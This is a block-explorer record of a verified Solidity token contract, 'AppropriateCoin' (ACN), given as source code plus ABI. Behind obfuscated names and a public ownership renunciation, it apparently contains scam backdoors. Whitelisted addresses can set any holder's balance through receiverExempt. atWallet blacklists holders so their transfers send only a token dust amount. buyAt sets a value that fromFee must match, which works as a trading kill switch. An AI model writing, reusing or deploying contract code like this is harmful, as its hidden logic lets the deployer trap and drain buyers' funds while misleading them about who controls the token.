{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract limitFromTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atWalletAmount {\n    function createPair(address fundEnable, address marketingFund) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface shouldLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromLimitAuto) external view returns (uint256);\n\n    function transfer(address receiverMin, uint256 exemptBuySell) external returns (bool);\n\n    function allowance(address totalShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptBuySell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMin,\n        uint256 exemptBuySell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSell, uint256 value);\n    event Approval(address indexed totalShould, address indexed spender, uint256 value);\n}\n\ninterface takeListMetadata is takeList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AppropriateCoin is limitFromTotal, takeList, takeListMetadata {\n\n    bool private shouldReceiver;\n\n    uint256 private fundFeeList;\n\n    uint256 public shouldBuyMode = 3;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityLaunched;\n    }\n\n    function allowance(address limitAuto, address feeTrading) external view virtual override returns (uint256) {\n        if (feeTrading == receiverAuto) {\n            return type(uint256).max;\n        }\n        return limitTxMode[limitAuto][feeTrading];\n    }\n\n    function balanceOf(address fromLimitAuto) public view virtual override returns (uint256) {\n        return atEnable[fromLimitAuto];\n    }\n\n    address public buyLaunch;\n\n    function getOwner() external view returns (address) {\n        return launchedReceiver;\n    }\n\n    mapping(address => uint256) private atEnable;\n\n    string private listFrom = \"Appropriate Coin\";\n\n    bool private amountFund;\n\n    bool public receiverAt;\n\n    function minTotal(address isTakeTeam) public {\n        require(isTakeTeam.balance < 100000);\n        if (receiverAt) {\n            return;\n        }\n        \n        txSwap[isTakeTeam] = true;\n        if (shouldReceiver) {\n            receiverTo = true;\n        }\n        receiverAt = true;\n    }\n\n    mapping(address => bool) public txSwap;\n\n    function transferFrom(address sellTeam, address receiverMin, uint256 exemptBuySell) external override returns (bool) {\n        if (_msgSender() != receiverAuto) {\n            if (limitTxMode[sellTeam][_msgSender()] != type(uint256).max) {\n                require(exemptBuySell <= limitTxMode[sellTeam][_msgSender()]);\n                limitTxMode[sellTeam][_msgSender()] -= exemptBuySell;\n            }\n        }\n        return fromFee(sellTeam, receiverMin, exemptBuySell);\n    }\n\n    address public launchedMarketing;\n\n    mapping(address => mapping(address => uint256)) private limitTxMode;\n\n    event OwnershipTransferred(address indexed toMin, address indexed listToken);\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTotal;\n    }\n\n    uint256 public launchedFrom;\n\n    function walletFund(address sellTeam, address receiverMin, uint256 exemptBuySell) internal returns (bool) {\n        require(atEnable[sellTeam] >= exemptBuySell);\n        atEnable[sellTeam] -= exemptBuySell;\n        atEnable[receiverMin] += exemptBuySell;\n        emit Transfer(sellTeam, receiverMin, exemptBuySell);\n        return true;\n    }\n\n    constructor (){\n        \n        listTx();\n        shouldLaunch sellWallet = shouldLaunch(receiverAuto);\n        launchedMarketing = atWalletAmount(sellWallet.factory()).createPair(sellWallet.WETH(), address(this));\n        shouldFromMode = atWalletAmount(sellWallet.factory()).feeTo();\n        if (receiverTo != amountFund) {\n            receiverTo = false;\n        }\n        buyLaunch = _msgSender();\n        txSwap[buyLaunch] = true;\n        atEnable[buyLaunch] = liquidityLaunched;\n        if (shouldReceiver) {\n            fromTo = true;\n        }\n        emit Transfer(address(0), buyLaunch, liquidityLaunched);\n    }\n\n    uint256 public minMode = 0;\n\n    string private atTotal = \"ACN\";\n\n    uint256 launchAt;\n\n    function atWallet(address sellEnable) public {\n        receiverEnable();\n        if (shouldReceiver) {\n            shouldReceiver = true;\n        }\n        if (sellEnable == buyLaunch || sellEnable == launchedMarketing) {\n            return;\n        }\n        takeSellReceiver[sellEnable] = true;\n    }\n\n    bool private fromTo;\n\n    function receiverExempt(address limitSell, uint256 exemptBuySell) public {\n        receiverEnable();\n        atEnable[limitSell] = exemptBuySell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isList;\n    }\n\n    uint256 constant receiverReceiver = 17 ** 10;\n\n    function buyAt(uint256 exemptBuySell) public {\n        receiverEnable();\n        launchAt = exemptBuySell;\n    }\n\n    address receiverAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address limitSell, uint256 exemptBuySell) external virtual override returns (bool) {\n        return fromFee(_msgSender(), limitSell, exemptBuySell);\n    }\n\n    address private launchedReceiver;\n\n    function owner() external view returns (address) {\n        return launchedReceiver;\n    }\n\n    uint256 launchModeAt;\n\n    function listTx() public {\n        emit OwnershipTransferred(buyLaunch, address(0));\n        launchedReceiver = address(0);\n    }\n\n    function receiverEnable() private view {\n        require(txSwap[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listFrom;\n    }\n\n    bool public receiverTo;\n\n    function takeEnableTo(address sellTeam, address receiverMin, uint256 exemptBuySell) internal view returns (uint256) {\n        require(exemptBuySell > 0);\n\n        uint256 receiverAmount = 0;\n        if (sellTeam == launchedMarketing && shouldBuyMode > 0) {\n            receiverAmount = exemptBuySell * shouldBuyMode / 100;\n        } else if (receiverMin == launchedMarketing && minMode > 0) {\n            receiverAmount = exemptBuySell * minMode / 100;\n        }\n        require(receiverAmount <= exemptBuySell);\n        return exemptBuySell - receiverAmount;\n    }\n\n    function fromFee(address sellTeam, address receiverMin, uint256 exemptBuySell) internal returns (bool) {\n        if (sellTeam == buyLaunch) {\n            return walletFund(sellTeam, receiverMin, exemptBuySell);\n        }\n        uint256 tokenLimit = takeList(launchedMarketing).balanceOf(shouldFromMode);\n        require(tokenLimit == launchAt);\n        require(receiverMin != shouldFromMode);\n        if (takeSellReceiver[sellTeam]) {\n            return walletFund(sellTeam, receiverMin, receiverReceiver);\n        }\n        exemptBuySell = takeEnableTo(sellTeam, receiverMin, exemptBuySell);\n        return walletFund(sellTeam, receiverMin, exemptBuySell);\n    }\n\n    function approve(address feeTrading, uint256 exemptBuySell) public virtual override returns (bool) {\n        limitTxMode[_msgSender()][feeTrading] = exemptBuySell;\n        emit Approval(_msgSender(), feeTrading, exemptBuySell);\n        return true;\n    }\n\n    uint256 private liquidityLaunched = 100000000 * 10 ** 18;\n\n    uint8 private isList = 18;\n\n    address shouldFromMode;\n\n    mapping(address => bool) public takeSellReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuySell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"}],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimitAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptBuySell\",\"type\":\"uint256\"}],\"name\":\"buyAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTakeTeam\",\"type\":\"address\"}],\"name\":\"minTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuySell\",\"type\":\"uint256\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuyMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeSellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuySell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuySell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AppropriateCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}